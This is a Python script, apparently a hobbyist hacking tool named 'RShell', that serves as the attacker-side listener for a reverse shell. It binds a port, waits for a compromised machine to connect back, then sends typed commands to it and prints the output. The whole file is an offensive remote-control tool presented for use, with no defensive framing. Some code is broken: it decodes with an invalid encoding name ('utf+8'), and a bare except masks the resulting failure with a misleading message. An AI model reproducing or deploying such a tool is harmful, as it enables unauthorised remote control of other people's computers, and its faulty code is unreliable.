#!/usr/bin/env python

import rban
import socket 
import os
import time
import sys
from colorama import Fore,Back,init
os.system("clear")
print(Fore.GREEN+rban.ban())
print(Fore.RED+"Author : 3P1C\t\tTester : Mr. Malware")
print(Fore.BLUE+"Version : e1.0\t\tRShell")
print(Fore.CYAN+"---------------+ Reverse Shell +---------------\n")
ip = input(Fore.GREEN+"[i] Enter Your Localhost Address :> ")
port = int(input(Fore.GREEN+"[i] Enter Localhost Port :> "))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.bind((ip,port))
    s.listen(1)
    print(Fore.YELLOW+"[+] Listening Port", port)
    conn,addr = s.accept()
    print("\n[+] Connected Remote Address :", addr)
    while True:
        cmd = input(Fore.GREEN+"\nRShell ~# ")
        if "bye" in cmd:
            conn.send("bye".encode("utf-8"))
            conn.close()
            break
            init()
        else:
            conn.send(str.encode(cmd))
            client = str(conn.recv(1024).decode("utf+8"))
            print(Fore.CYAN+client)
            init()
except:
    print(Back.RED+"[!] Require : TCP Address ")
    init()
